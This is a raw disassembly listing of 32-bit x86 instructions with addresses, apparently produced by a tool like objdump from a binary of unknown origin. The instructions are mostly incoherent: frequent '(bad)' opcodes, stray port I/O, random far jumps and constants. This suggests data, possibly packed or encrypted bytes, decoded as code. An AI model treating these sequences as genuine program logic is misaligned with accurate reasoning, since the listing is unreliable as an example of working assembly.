  426d1b:	mov    ch,BYTE PTR [ecx]
  426d1d:	dec    esi
  426d1e:	fstp   DWORD PTR [edx]
  426d20:	test   eax,0x45651583
  426d25:	jle    0x426d67
  426d27:	push   ebx
  426d28:	mov    cl,al
  426d2a:	(bad)  
  426d2b:	xor    edi,DWORD PTR [ebp-0xf255839]
  426d31:	or     bx,bx
  426d34:	bswap  ebx
  426d36:	dec    edi
  426d37:	mov    dh,0x59
  426d39:	xchg   edi,eax
  426d3a:	pop    ds
  426d3b:	in     al,0x1b
  426d3d:	mov    DWORD PTR [edx+eax*2],eax
  426d40:	dec    ebp
  426d41:	sbb    edi,DWORD PTR [ebx+ebp*4]
  426d44:	test   BYTE PTR [ebp-0x6bb464ec],bl
  426d4a:	scas   eax,DWORD PTR es:[edi]
  426d4b:	repnz in eax,0x3a
  426d4e:	bound  ebx,QWORD PTR [edx+ebx*8+0x2d6bcc8e]
  426d55:	inc    edi
  426d56:	rcr    DWORD PTR [edi+0x71],1
  426d59:	lods   al,BYTE PTR ds:[esi]
  426d5a:	jmp    0x8081:0x27cf3dff
  426d61:	xor    DWORD PTR [edi],ebx
  426d63:	xchg   ebp,eax
  426d64:	pop    ecx
  426d65:	inc    ebp
  426d66:	ror    BYTE PTR [ebx+esi*4],0x8a
  426d6a:	sub    eax,0x8995eff2
  426d6f:	jnp    0x426d0a
  426d71:	stos   BYTE PTR es:[edi],al
  426d72:	add    BYTE PTR [esi-0x11],dl
  426d75:	push   esp
  426d76:	mov    ?,esi
  426d78:	or     DWORD PTR [edi+0x44],ebp
  426d7b:	pop    edx
  426d7c:	lods   al,BYTE PTR ds:[esi]
  426d7d:	in     eax,0x7
  426d7f:	push   cs
  426d80:	push   cs
  426d81:	mov    ebx,0xe2044d7d
  426d86:	cwde   
  426d87:	cmp    DWORD PTR fs:[ebx+eiz*4],0x85cb1e2f
  426d8f:	sub    ebx,edx
	...
  426df1:	add    BYTE PTR [eax],al
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0x940c:0xc7c2ecf9
  426e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e02:	add    esi,DWORD PTR [edi-0x32]
  426e05:	lahf   
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    eax,0x42000001
  426e0d:	popf   
  426e0e:	pcmpgtw mm0,QWORD PTR [ebx]
  426e11:	cmp    bl,BYTE PTR [ecx+0x473cb8be]
  426e17:	or     BYTE PTR [edi+0x62],bl
  426e1a:	enter  0x8572,0x14
  426e1e:	leave  
  426e1f:	adc    BYTE PTR [esi+0x5c],0x7
  426e23:	sub    eax,0xc3d88ef0
  426e28:	scas   eax,DWORD PTR es:[edi]
  426e29:	xor    eax,0xb1569c66
  426e2e:	cmc    
  426e2f:	pop    ebp
  426e30:	aad    0x15
  426e32:	scas   al,BYTE PTR es:[edi]
  426e33:	aad    0xac
  426e35:	xor    BYTE PTR [ebx+0x52cb3a8c],0xee
  426e3c:	es cmc 
  426e3e:	push   ss
  426e3f:	std    
  426e40:	stos   DWORD PTR es:[edi],eax
  426e41:	(bad)  
  426e43:	std    
  426e44:	mov    esi,0x91d327c0
  426e49:	xchg   esi,eax
  426e4a:	dec    esp
  426e4b:	xor    bl,cl
  426e4d:	out    dx,eax
  426e4e:	(bad)  
  426e4f:	push   edx
  426e50:	into   
  426e51:	icebp  
  426e52:	pop    edi
  426e53:	inc    eax
  426e54:	es jo  0x426e50
  426e57:	pop    ebp
  426e58:	iret   
  426e59:	sub    eax,0x11c69a93
  426e5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e5f:	ins    DWORD PTR es:[edi],dx
  426e60:	aam    0x5e
  426e62:	jmp    0x426eca
  426e64:	add    BYTE PTR [edx-0x6182abed],0x12
  426e6b:	adc    esp,DWORD PTR [eax+0x17]
  426e6e:	dec    ebp
  426e6f:	sub    al,0x38
  426e71:	fsubr  QWORD PTR [edx-0x2d]
  426e74:	retf   
  426e75:	jbe    0x426e5a
  426e77:	adc    ch,BYTE PTR [edi+eiz*8]
  426e7a:	stc    
  426e7b:	pop    esp
  426e7c:	fmul   st(5),st
  426e7e:	stos   DWORD PTR es:[edi],eax
  426e7f:	push   edi
  426e80:	jnp    0x426ebb
  426e82:	ret    
  426e83:	out    0xec,eax
  426e85:	stos   DWORD PTR es:[edi],eax
  426e86:	enter  0x15f8,0xd2
  426e8a:	mul    DWORD PTR [ecx+ebx*2+0x604293c8]
  426e91:	mov    cl,0x23
  426e93:	or     al,0xe7
  426e95:	mov    edx,0x9249c777
  426e9a:	addr16 mov al,0x94
  426e9d:	(bad)  
  426e9e:	icebp  
  426e9f:	xor    ecx,DWORD PTR [edx-0x346ce5de]
  426ea5:	jmp    0x9ead:0x2915728
  426eac:	mov    ds:0x8ae299c4,eax
  426eb1:	sub    al,0xf0
  426eb3:	mov    ebp,0x4940cad7
  426eb8:	std    
  426eb9:	repz xchg ebx,eax
  426ebb:	rol    DWORD PTR [eax+0x4b],1
  426ebe:	add    eax,0xfc41a16c
  426ec3:	cmp    BYTE PTR [ecx+0x3e],dl
  426ec6:	ror    bl,1
  426ec8:	mov    DWORD PTR [ebx+0x5d8f7aec],esi
  426ece:	sar    BYTE PTR [esi-0x63e31983],cl
  426ed4:	cmp    al,0xae
  426ed6:	aas    
  426ed7:	push   esi
  426ed8:	add    ebp,DWORD PTR [edi-0x552f18dc]
  426ede:	repz iret 
  426ee0:	mov    bl,0xa3
  426ee2:	repz pop DWORD PTR [ecx+0x261efa4e]
  426ee9:	inc    esi
  426eea:	js     0x426ee9
  426eec:	(bad)  
  426eed:	(bad)  
  426eee:	xchg   edi,eax
  426eef:	popf   
  426ef0:	inc    eax
  426ef1:	cmp    eax,0xa52bdabb
  426ef6:	push   esi
  426ef7:	or     ecx,DWORD PTR [esi]
  426ef9:	pop    ecx
  426efa:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  426efc:	ficomp DWORD PTR [edi]
  426efe:	and    dh,bh
  426f00:	(bad)  
  426f01:	neg    DWORD PTR [eax+0x69]
  426f04:	dec    esp
  426f05:	add    BYTE PTR [esi],dh
  426f07:	dec    ecx
  426f08:	push   cs
  426f09:	lahf   
  426f0a:	inc    ebp
  426f0b:	ja     0x426f05
  426f0d:	fwait
  426f0e:	cdq    
  426f0f:	adc    BYTE PTR [ebp+0x0],0x0
	...
  426f72:	add    BYTE PTR [eax],al
  426f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f75:	mov    ds:0xf5c7f1c7,al
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [edi+eax*4-0x2c971beb],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	rcl    dh,0x69
  426f8f:	cmp    eax,0xb00d67ba
  426f94:	xor    al,0xc9
  426f96:	jae    0x426fea
  426f98:	add    al,bl
  426f9a:	fs jle 0x426f27
  426f9d:	call   DWORD PTR [ebx-0x36]
  426fa0:	cmp    ecx,DWORD PTR [ecx+ecx*8+0x5a6ab76a]
  426fa7:	xor    esi,DWORD PTR [eax]
  426fa9:	adc    bh,BYTE PTR [edi+0x6e]
  426fac:	(bad)  
  426fad:	daa    
  426fae:	cmp    al,0x38
  426fb0:	mov    al,cs:0xfc4b6d93
  426fb6:	or     DWORD PTR [esi-0x78],ebp
  426fb9:	cmp    eax,0xd56e687d
  426fbe:	push   cs
  426fbf:	fadd   QWORD PTR [esi]
  426fc1:	fisub  DWORD PTR [edi+eiz*1+0x5b]
  426fc5:	inc    ebp
  426fc6:	sbb    eax,0xb066aaeb
  426fcc:	push   ecx
  426fcd:	popf   
  426fce:	out    dx,al
  426fcf:	fwait
  426fd0:	(bad)  
  426fd1:	cmp    DWORD PTR [ebx+ecx*8-0x44],ecx
  426fd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fd6:	cmp    eax,0x54e2f112
  426fdb:	(bad)  
  426fdc:	std    
  426fdd:	push   0xf86cbaf1
  426fe2:	icebp  
  426fe3:	jne    0x426fe3
  426fe5:	shl    bh,1
  426fe7:	jns    0x427029
  426fe9:	mov    edx,0xabda846e
  426fee:	outs   dx,DWORD PTR ds:[esi]
  426fef:	xor    ah,BYTE PTR [ecx+ebx*1-0x73]
  426ff3:	neg    DWORD PTR [ecx+0x74]
  426ff6:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  426ff8:	jb     0x426ffc
  426ffa:	dec    esp
  426ffb:	jae    0x427058
  426ffd:	rcr    DWORD PTR [ecx],1
  426fff:	sub    dh,BYTE PTR [eax-0x25]
  427002:	cld    
  427003:	out    0x7d,eax
  427005:	scas   eax,DWORD PTR es:[edi]
  427006:	mov    esp,0x352e94f2
  42700b:	or     al,0x3e
  42700d:	lods   eax,DWORD PTR ds:[esi]
  42700e:	add    al,0xac
  427010:	(bad)  
  427011:	mov    al,ds:0x98984453
  427016:	nop
  427017:	push   ds
  427018:	enter  0x1a7b,0x2f
  42701c:	cmp    al,BYTE PTR [edi-0x5e3c0e2]
  427022:	sbb    eax,0xb4e27080
  427027:	xor    eax,eax
  427029:	lahf   
  42702a:	inc    ebx
  42702b:	outs   dx,BYTE PTR ds:[esi]
  42702c:	mov    ecx,0xaf1b96ee
  427031:	sub    bh,BYTE PTR [edi+edx*1]
  427034:	jle    0x427072
  427036:	les    ebx,FWORD PTR [edx]
  427038:	(bad)
  42703c:	and    BYTE PTR [esi],0x6c
  42703f:	jb     0x4270ac
  427041:	push   ds
  427042:	pop    esi
  427043:	and    al,0xb0
  427045:	add    al,0x2c
  427047:	mov    al,0xc
  427049:	push   0xfb6545cd
  42704e:	loop   0x42709f
  427050:	mov    bl,0x1a
  427052:	cmp    dl,BYTE PTR [esp+edx*8-0x51483526]
  427059:	mov    esi,0x81ba8c92
  42705e:	int3   
  42705f:	sbb    al,0xf3
  427061:	icebp  
  427062:	push   edi
  427063:	or     BYTE PTR [ecx-0x2d],0x1c
  427067:	mov    BYTE PTR [eax+0x2d020c32],bl
  42706d:	inc    eax
  42706e:	pop    ecx
  42706f:	loopne 0x42701b
  427071:	or     al,BYTE PTR [esi]
  427073:	inc    ecx
  427074:	add    eax,0x7a730873
  427079:	push   edx
  42707a:	push   0xffffff8e
  42707c:	retf   0xb143
  42707f:	lods   al,BYTE PTR ds:[esi]
  427080:	repz jne 0x4270c1
  427083:	jp     0x4270dd
  427085:	cmp    bh,BYTE PTR [ebp+0xb872c6]
  42708b:	dec    esp
  42708c:	nop
  42708d:	cdq    
  42708e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42708f:	stc    
  427090:	mov    esp,0x0
	...
  4270f1:	add    BYTE PTR [eax],al
  4270f3:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  4270fa:	(bad)  
  4270fb:	std    
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x868c9d96
  427102:	out    dx,al
  427103:	sub    eax,ebx
  427105:	mov    eax,ds:0x1050001
  42710a:	add    BYTE PTR [eax],al
  42710c:	je     0x4270e4
  42710e:	les    ecx,FWORD PTR [eax+eiz*4]
  427111:	mov    ch,BYTE PTR [esi-0x38]
  427114:	clc    
  427115:	xchg   DWORD PTR [ecx],esp
  427117:	ins    BYTE PTR es:[edi],dx
  427118:	cs ret 0xfed5
  42711c:	push   es
  42711d:	popa   
  42711e:	mov    ch,0xdb
  427120:	jo     0x42715a
  427122:	sbb    esi,edx
  427124:	adc    eax,0x42e2b10e
  427129:	std    
  42712a:	push   cs
  42712b:	xlat   BYTE PTR ds:[ebx]
  42712c:	mov    bh,0x7b
  42712e:	fadd   st,st(7)
  427130:	sub    DWORD PTR [ebp*1+0x6262ce56],ecx
  427137:	call   FWORD PTR [esi-0x1a]
  42713a:	mov    cl,BYTE PTR [ebx-0x59]
  42713d:	adc    ah,cl
  42713f:	(bad)
  427142:	mov    bh,0x87
  427144:	nop
  427145:	push   esi
  427146:	mov    bl,0x55
  427148:	lods   eax,DWORD PTR ds:[esi]
  427149:	mov    ch,0xdc
  42714b:	adc    eax,0x8e68ebf1
  427150:	cmp    DWORD PTR ds:0xd4beaf36,edx
  427156:	push   ds
  427157:	addr16 cld 
  427159:	push   esi
  42715a:	(bad)  
  42715b:	pop    ds
  42715c:	mov    bh,0x5c
  42715e:	div    DWORD PTR [ebx]
  427160:	ret    
  427161:	push   esp
  427162:	sub    cl,dh
  427164:	(bad)  
  427165:	(bad)  
  427166:	sub    al,BYTE PTR [esi+esi*2]
  427169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42716a:	xchg   ebx,eax
  42716b:	pop    ss
  42716c:	mov    ?,WORD PTR [edi]
  42716e:	stc    
  42716f:	bound  esi,QWORD PTR [edx]
  427171:	fs fwait
  427173:	or     BYTE PTR [edi+0x5de6904],ah
  427179:	or     DWORD PTR [edx+0x76],ecx
  42717c:	test   DWORD PTR [ebx+0x0],esi
  42717f:	lea    edx,[eax]
  427181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427182:	cmp    al,0x57
  427184:	sub    eax,eax
  427186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427187:	dec    edi
  427188:	sahf   
  427189:	fs mov esi,0xbedc0761
  42718f:	rcr    BYTE PTR ds:0x1be0fcaf,cl
  427195:	aaa    
  427196:	test   DWORD PTR [ecx],edx
  427198:	pop    esi
  427199:	dec    ebp
  42719a:	test   eax,0xd390f944
  42719f:	adc    al,0x9e
  4271a1:	pusha  
  4271a2:	out    0x93,eax
  4271a4:	dec    ecx
  4271a5:	loop   0x427199
  4271a7:	push   esp
  4271a8:	scas   al,BYTE PTR es:[edi]
  4271a9:	xchg   edx,esi
  4271ab:	mov    cs,WORD PTR [ecx]
  4271ad:	push   ss
  4271ae:	jb     0x4271a1
  4271b0:	push   eax
  4271b1:	pusha  
  4271b2:	add    eax,0x3125746f
  4271b7:	xor    eax,0x6af3c171
  4271bc:	rcl    DWORD PTR [eax],cl
  4271be:	fwait
  4271bf:	test   BYTE PTR [ecx-0x66e41e11],dl
  4271c5:	out    0x9a,eax
  4271c7:	adc    eax,0x5969415a
  4271cc:	mov    esi,0x41be12a8
  4271d1:	ror    edx,1
  4271d3:	daa    
  4271d4:	(bad)
  4271d8:	ret    0x49de
  4271db:	cmp    DWORD PTR [ebx],eax
  4271dd:	xor    esp,DWORD PTR ds:0xa6715e1a
  4271e3:	in     eax,0x44
  4271e5:	dec    ebx
  4271e6:	sbb    eax,0x500ac372
  4271eb:	xchg   edi,eax
  4271ec:	pop    edi
  4271ed:	add    edi,ecx
  4271ef:	inc    eax
  4271f0:	enter  0x2bcb,0xd9
  4271f4:	jecxz  0x4271a0
  4271f6:	add    bl,ah
  4271f8:	inc    esp
  4271f9:	lods   al,BYTE PTR ds:[esi]
  4271fa:	scas   al,BYTE PTR es:[edi]
  4271fb:	mov    al,0x12
  4271fd:	stos   DWORD PTR es:[edi],eax
  4271fe:	cdq    
  4271ff:	cli    
  427200:	bound  ebp,QWORD PTR [edi]
  427202:	xor    dh,BYTE PTR [edi+0x1dad55b]
  427208:	out    dx,al
  427209:	sbb    esp,DWORD PTR [edx]
  42720b:	in     al,dx
  42720c:	xor    eax,0xf12a9697
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x95810b39,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	jl     0x4272df
  42728e:	or     DWORD PTR [edi-0x317d01b6],esi
  427294:	je     0x4272ee
  427296:	jle    0x4272fc
  427298:	and    BYTE PTR [ebx+0x25],0xe5
  42729c:	cmp    DWORD PTR [ebx],esp
  42729e:	lahf   
  42729f:	push   ss
  4272a0:	jno    0x4272ef
  4272a2:	das    
  4272a3:	(bad)  
  4272a4:	mov    edi,0xa5c09942
  4272a9:	cdq    
  4272aa:	stc    
  4272ab:	or     edx,DWORD PTR [ebx]
  4272ad:	int    0xf1
  4272af:	mov    cl,0x9
  4272b1:	fdivr  QWORD PTR [eax+0x63]
  4272b4:	jbe    0x4272a6
  4272b6:	aaa    
  4272b7:	adc    BYTE PTR [ebx],dh
  4272b9:	gs inc esp
  4272bb:	cli    
  4272bc:	cmp    BYTE PTR [edx],0x42
  4272bf:	push   edx
  4272c0:	test   eax,0x37c73ac0
  4272c5:	in     eax,dx
  4272c6:	out    dx,al
  4272c7:	sahf   
  4272c8:	lods   al,BYTE PTR ds:[esi]
  4272c9:	xchg   BYTE PTR [eax+0x40],al
  4272cc:	fimul  WORD PTR [ebx+0x24]
  4272cf:	sub    eax,0x4086e69a
  4272d4:	mov    cl,0x6
  4272d6:	fadd   QWORD PTR [edi+0x3234a878]
  4272dc:	mov    al,0xf
  4272de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272df:	aas    
  4272e0:	out    dx,eax
  4272e1:	enter  0xe5a0,0x97
  4272e5:	in     eax,0x1f
  4272e7:	and    BYTE PTR [ebx+0x55],ah
  4272ea:	mov    edx,ebp
  4272ec:	cmc    
  4272ed:	push   0x71
  4272ef:	pop    es
  4272f0:	cmp    al,0x3d
  4272f2:	xchg   ecx,eax
  4272f3:	sbb    eax,0x7c6bc1eb
  4272f8:	mov    ds:0x12db347,eax
  4272fd:	pop    ebx
  4272fe:	out    dx,eax
  4272ff:	loope  0x42735f
  427301:	imul   edi,eax,0x18
  427304:	dec    ecx
  427305:	aad    0x73
  427307:	push   es
  427308:	outs   dx,DWORD PTR ds:[esi]
  427309:	outs   dx,DWORD PTR ds:[esi]
  42730a:	nop
  42730b:	jnp    0x427335
  42730d:	dec    eax
  42730e:	pop    ss
  42730f:	dec    ebp
  427310:	jmp    0x61a27778
  427315:	jae    0x4272d5
  427317:	jns    0x4272d0
  427319:	out    0xf6,eax
  42731b:	and    eax,0x70ee0f02
  427320:	push   es
  427321:	lahf   
  427322:	adc    DWORD PTR [edi],ebx
  427324:	mov    ch,0xd8
  427326:	adc    eax,0x825778d6
  42732b:	gs jb  0x42732a
  42732e:	jg     0x427388
  427330:	ret    
  427331:	xchg   ebp,eax
  427332:	jmp    0x923a:0xecaf1225
  427339:	xchg   ebx,eax
  42733a:	xchg   esi,eax
  42733b:	fnstenv [edx+0x3dc5a904]
  427341:	call   0xb05f:0xc005c885
  427348:	mov    dh,0x4e
  42734a:	pop    ebp
  42734b:	lods   al,BYTE PTR ds:[esi]
  42734c:	into   
  42734d:	mov    bl,0x2c
  42734f:	sub    ah,bh
  427351:	ins    DWORD PTR es:[edi],dx
  427352:	aas    
  427353:	(bad)  
  427354:	fdiv   st,st(3)
  427356:	jge    0x427320
  427358:	shr    DWORD PTR [edx+0x683c7d2],1
  42735e:	inc    edi
  42735f:	stc    
  427360:	xor    dh,BYTE PTR [edx+0x304295eb]
  427366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427367:	(bad)  
  427368:	int    0x1f
  42736a:	fbld   TBYTE PTR [eax-0x5a6a8fde]
  427370:	ret    0xec9d
  427373:	popa   
  427374:	pop    ds
  427375:	int3   
  427376:	dec    esi
  427377:	push   eax
  427378:	sub    BYTE PTR [ebp-0x28a273a],dl
  42737e:	out    0x9d,eax
  427380:	sub    eax,0x589f079b
  427385:	das    
  427386:	cvtpi2ps xmm0,QWORD PTR [edx+0x3b51b51e]
  42738d:	scas   al,BYTE PTR es:[edi]
  42738e:	sub    esi,0x66
	...
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    edi,DWORD PTR [ebx+0x5a]
  427402:	and    BYTE PTR [ecx+0x1a3e2],ch
  427408:	add    eax,0x3a000001
  42740d:	jb     0x4273e1
  42740f:	sbb    eax,0x18fc3929
  427414:	gs dec ecx
  427416:	jle    0x4273ed
  427418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427419:	sub    DWORD PTR [ebx-0x20],ecx
  42741c:	xchg   ecx,eax
  42741d:	popw   ds
  42741f:	outs   dx,DWORD PTR ds:[esi]
  427420:	loopne 0x42746f
  427422:	je     0x427497
  427424:	loop   0x427410
  427426:	mov    ecx,0x54a4d5c5
  42742b:	inc    ecx
  42742c:	push   ecx
  42742d:	sbb    al,0xf0
  42742f:	idiv   BYTE PTR [eax+0x49]
  427432:	pop    es
  427433:	cmp    ecx,eax
  427435:	rcr    DWORD PTR [ecx+0x2e421939],1
  42743b:	into   
  42743c:	and    DWORD PTR [ebp-0x2121cb15],0xfd0c93d0
  427446:	and    eax,DWORD PTR [edx-0x4d]
  427449:	cmp    DWORD PTR ds:0xc4e8708d,ebp
  42744f:	adc    al,0x83
  427451:	add    BYTE PTR [ecx-0x33],cl
  427454:	shl    BYTE PTR [ebp-0x3b255705],0xc1
  42745b:	cli    
  42745c:	sbb    DWORD PTR [ebx],edi
  42745e:	mov    al,ds:0xcee449d3
  427463:	ins    BYTE PTR es:[edi],dx
  427464:	lahf   
  427465:	cmp    dl,ch
  427467:	je     0x427422
  427469:	aas    
  42746a:	inc    esp
  42746b:	jnp    0x4274e5
  42746d:	ret    0x5391
  427470:	shr    DWORD PTR ss:[ebx+0x38],cl
  427474:	dec    esi
  427475:	adc    DWORD PTR [eax-0xe],ecx
  427478:	leave  
  427479:	out    dx,al
  42747a:	adc    eax,0x71334385
  42747f:	inc    edi
  427480:	out    dx,eax
  427481:	pop    edi
  427482:	sub    DWORD PTR [eax+0x1403c61d],ebx
  427488:	sbb    ebp,edx
  42748a:	mov    esp,0x2cf1b9ff
  42748f:	bound  eax,QWORD PTR [edi+edx*2-0x72]
  427493:	xchg   esi,eax
  427494:	jmp    0x427442
  427496:	xchg   esp,eax
  427497:	(bad)  
  427498:	mov    edx,0x7e908e9d
  42749d:	xor    eax,0x2c90d6a
  4274a2:	mov    cl,0x46
  4274a4:	cdq    
  4274a5:	hlt    
  4274a6:	pop    ss
  4274a7:	iret   
  4274a8:	dec    ecx
  4274a9:	xor    eax,0x70871d11
  4274ae:	dec    ecx
  4274af:	gs or  eax,0x384a17e7
  4274b5:	cmp    BYTE PTR [ecx-0x1a],bh
  4274b8:	ins    BYTE PTR es:[edi],dx
  4274b9:	fistp  WORD PTR [esi]
  4274bb:	cs hlt 
  4274bd:	mov    dh,0x24
  4274bf:	and    esp,esi
  4274c1:	(bad)  
  4274c2:	push   edi
  4274c3:	cmc    
  4274c4:	push   ebx
  4274c5:	pushf  
  4274c6:	sub    DWORD PTR [esp+edi*1],esp
  4274c9:	ret    
  4274ca:	mov    bh,0x27
  4274cc:	pop    eax
  4274cd:	jnp    0x4274ea
  4274cf:	aaa    
  4274d0:	jmp    0x42748c
  4274d2:	sub    al,0x4f
  4274d4:	mov    dh,0x7c
  4274d6:	push   0xa73d5e51
  4274db:	ja     0x42748e
  4274dd:	push   ecx
  4274de:	cmp    BYTE PTR [ebp+0x3b],dl
  4274e1:	xchg   BYTE PTR [edi+0x31],bh
  4274e4:	dec    esp
  4274e5:	bound  eax,QWORD PTR [ebx+ecx*8-0x7a2d556b]
  4274ec:	sahf   
  4274ed:	cmp    dh,bh
  4274ef:	jge    0x4274cb
  4274f1:	fucomi st,st(4)
  4274f3:	jne    0x427553
  4274f5:	mov    eax,ds:0x6b828de
  4274fa:	jo     0x42751d
  4274fc:	rol    esi,0xe2
  4274ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427500:	and    esi,edi
  427502:	clc    
  427503:	add    ecx,edx
  427505:	pusha  
  427506:	pusha  
  427507:	rcr    DWORD PTR [ebx-0x8],cl
  42750a:	fistp  DWORD PTR [ecx]
  42750c:	retf   
  42750d:	(bad)  
  42750e:	inc    ebp
  42750f:	or     al,0x8
	...
  427571:	add    BYTE PTR [eax],al
  427573:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	repz pop edi
  427582:	pop    ebx
  427583:	jg     0x42756c
  427585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427586:	add    DWORD PTR [eax],eax
  427588:	add    eax,0xa8000001
  42758d:	xchg   edx,eax
  42758e:	in     eax,0x8c
  427590:	xchg   ecx,eax
  427591:	fdiv   st(6),st
  427593:	pop    esi
  427594:	sub    ebp,DWORD PTR [edi-0x2404fd5e]
  42759a:	repz mov ecx,DWORD PTR [edi+0x42]
  42759e:	add    al,0x7a
  4275a0:	scas   eax,DWORD PTR es:[edi]
  4275a1:	test   BYTE PTR [ebp+0x4cb07460],0x22
  4275a8:	push   ss
  4275a9:	fisub  DWORD PTR [ebp-0x29393549]
  4275af:	shr    BYTE PTR [edx+0x71],1
  4275b2:	lods   eax,DWORD PTR ds:[esi]
  4275b3:	iret   
  4275b4:	sbb    al,0x3d
  4275b6:	mov    al,0xbc
  4275b8:	jmp    0x4275ff
  4275ba:	jno    0x427598
  4275bc:	aam    0x12
  4275be:	mov    fs,edi
  4275c0:	imul   esi,DWORD PTR [ebp+0x26bb7958],0xbc624afd
  4275ca:	xor    al,BYTE PTR [ebx+0x1861f9a9]
  4275d0:	xor    BYTE PTR [eax],bl
  4275d2:	or     al,0x21
  4275d4:	pop    ebx
  4275d5:	add    eax,0x6dbca3ba
  4275da:	jnp    0x42757d
  4275dc:	data16 das 
  4275de:	leave  
  4275df:	shl    dh,0x65
  4275e2:	sub    DWORD PTR ss:[edx],edi
  4275e5:	add    DWORD PTR [eax-0x6f92b771],ebp
  4275eb:	adc    al,0x74
  4275ed:	push   eax
  4275ee:	fwait
  4275ef:	aam    0x46
  4275f1:	stc    
  4275f2:	push   0x790e301e
  4275f7:	jns    0x4275ed
  4275f9:	ds mov cl,0x7d
  4275fc:	das    
  4275fd:	outs   dx,BYTE PTR ds:[esi]
  4275fe:	add    al,0xce
  427600:	arpl   WORD PTR [ebx-0x9],di
  427603:	gs cld 
  427605:	jbe    0x427589
  427607:	adc    BYTE PTR ds:0x327f928e,al
  42760d:	mov    ds:0xd24a4e24,eax
  427612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427613:	sub    cl,BYTE PTR [edx-0x43796e82]
  427619:	fidivr DWORD PTR [ecx+0x2bd36ff1]
  42761f:	xchg   ebx,eax
  427620:	and    al,0xbc
  427622:	int3   
  427623:	inc    ebx
  427624:	les    esp,FWORD PTR [edi-0x2d]
  427627:	jo     0x427636
  427629:	pop    ss
  42762a:	mov    bh,BYTE PTR [ebp+0x4673dd76]
  427630:	aam    0xcb
  427632:	jnp    0x4275ef
  427634:	lea    esi,[eax+0x27]
  427637:	jp     0x427613
  427639:	push   ebx
  42763a:	hlt    
  42763b:	pop    edx
  42763c:	pop    esp
  42763d:	(bad)  
  42763f:	out    dx,al
  427640:	xchg   edx,eax
  427641:	adc    BYTE PTR [ecx+0x68],0x3d
  427645:	std    
  427646:	mov    edx,esp
  427648:	pop    ecx
  427649:	xlat   BYTE PTR ds:[ebx]
  42764a:	xor    eax,0xa72e8608
  42764f:	out    0x4d,al
  427651:	mov    ebx,0xce71d4d6
  427656:	add    eax,0x6cd07fc9
  42765b:	iret   
  42765c:	inc    esp
  42765d:	aas    
  42765e:	loop   0x427622
  427660:	out    dx,eax
  427661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427662:	enter  0x7965,0xce
  427666:	add    al,BYTE PTR [edi-0x43]
  427669:	add    al,0xe0
  42766b:	repz mov ebp,DWORD PTR [edi+0xd60fbdd]
  427672:	lahf   
  427673:	pop    ebx
  427674:	mov    bh,0xb1
  427676:	mov    esi,0xee956747
  42767b:	mov    edi,eax
  42767d:	sub    DWORD PTR [edx+0x5a],esp
  427680:	xor    al,0x47
  427682:	mov    eax,ds:0x7b9440b7
  427687:	dec    edx
  427688:	fidivr WORD PTR ds:0xd0464a1d
  42768e:	fdiv   DWORD PTR [edx-0x61]
	...
  4276f1:	add    BYTE PTR [eax],al
  4276f3:	add    BYTE PTR [ecx],al
  4276f5:	push   esi
  4276f6:	nop
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	(bad)  
  427701:	and    ah,BYTE PTR [ebx]
  427703:	pop    edx
  427704:	in     al,dx
  427705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    eax,0x38000001
  42770d:	xor    al,0x23
  42770f:	or     BYTE PTR [eax-0x24],dl
  427712:	sub    DWORD PTR [eax+0x182b4613],0x6d
  427719:	pop    ebx
  42771a:	cs aaa 
  42771c:	call   0x4eedc91a
  427721:	retf   
  427722:	cmp    DWORD PTR ds:0x5d7c36d3,edi
  427728:	dec    ebp
  427729:	jnp    0x4276d7
  42772b:	in     eax,dx
  42772c:	(bad)  
  42772d:	repz mov esp,0xe716ca29
  427733:	ficom  DWORD PTR [esp+eiz*2+0x60]
  427737:	sub    al,BYTE PTR [ecx+ebp*4-0x61]
  42773b:	and    cl,BYTE PTR [esi-0x77]
  42773e:	fbstp  TBYTE PTR [ebx+eax*8+0x7a]
  427742:	xchg   ebp,eax
  427743:	fidivr WORD PTR [eax-0x2]
  427746:	test   eax,0xaaafa494
  42774b:	arpl   WORD PTR [ebp-0x53],bp
